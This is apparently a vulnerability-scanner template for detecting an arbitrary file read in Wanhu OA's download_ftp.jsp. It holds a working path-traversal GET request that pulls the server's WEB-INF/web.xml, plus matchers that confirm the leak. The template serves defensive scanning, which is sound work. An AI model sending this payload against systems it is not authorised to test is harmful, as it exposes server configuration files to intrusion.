id: wanhu-download-ftp-file-read
name: Wanhu OA download_ftp.jsp - Arbitrary File Read
severity: high
confidence: confirmed
description: There is an arbitrary file download vulnerability in the Wanhu OA download_ftp.jsp file. An attacker can download
  any file on the server through the vulnerability.
reference: http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20download_ftp.jsp%20任意文件下载漏洞.html
tags:
- wanhu
- lfi
- vuln
requests:
- method: GET
  path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
  matchers:
  - type: body
    words:
    - <?xml version=
    - web-app
    - display-name
  - type: status
    status:
    - 200
  condition: and
